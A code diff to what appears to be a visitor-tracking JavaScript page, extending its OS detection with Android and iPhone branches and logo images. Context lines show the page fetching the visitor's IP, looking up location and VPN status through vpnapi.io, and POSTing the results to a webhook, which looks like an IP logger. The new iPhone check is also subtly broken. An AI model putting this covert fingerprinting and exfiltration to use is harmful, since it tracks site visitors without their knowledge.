@@ -26,16 +26,19 @@ function detectOS() {
   let os = navigator.userAgent;
   let finalOs="";
   if (os.search('Windows')!==-1){
-      finalOs="Windows";
-  }
-  else if (os.search('Mac')!==-1){
-      finalOs="MacOS";
-  }
-  else if (os.search('X11')!==-1 && !(os.search('Linux')!==-1)){
-      finalOs="UNIX";
-  }
-  else if (os.search('Linux')!==-1 && os.search('X11')!==-1){
-      finalOs="Linux"
+      finalOs = "Windows";
+  } else if (os.search('Mac')!==-1){
+      finalOs = "MacOS";
+  } else if (os.search('X11')!==-1 && !(os.search('Linux')!==-1)){
+      finalOs = "UNIX";
+  } else if (os.search('Linux')!==-1 && os.search('X11')!==-1){
+      finalOs = "Linux"
+  } else if (os.search('Android')!==-1){
+      finalOs = "Android"
+  } else if (os.search('iPhone')){
+      finalOs = "iPhone"
+  } else {
+    finalOs = "yokse"
   }
   return finalOs
 
@@ -61,7 +64,6 @@ function detectBrowser() {
 
   return browserName
 };
-
 
 function is_mobile() {
   var a;
@@ -138,7 +140,6 @@ async function detectLocation(ip) {
     throw new Error("Error al hacer la consulta a la API");
   }
 };
-
 
 async function generateLink(ip, site) {
   const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
@@ -220,6 +221,10 @@ function imgOS() {
     return "https://www.freepnglogos.com/uploads/windows-logo-png/windows-logo-logok-0.png"
   }else if (OSname == "Mac") {
     return "https://cdn-icons-png.flaticon.com/512/2/2235.png"
+  } else if (OSname == "Android") {
+    return "https://upload.wikimedia.org/wikipedia/commons/thumb/6/64/Android_logo_2019_%28stacked%29.svg/2346px-Android_logo_2019_%28stacked%29.svg.png"
+  } else if (OSname == "iPhone") {
+    return "https://media.croma.com/image/upload/v1662703724/Croma%20Assets/Communication/Mobiles/Images/261934_qgssvy.png"
   }else { 
     return "https://www.expofarm.es/wp-content/uploads/2021/09/cruz-farmacia.jpg"
   }
@@ -308,6 +313,7 @@ fetch('https://api.ipify.org/?format=json')
         }
       ]
     };
+
     fetch(webwhook, {
       method: 'POST',
       headers: {
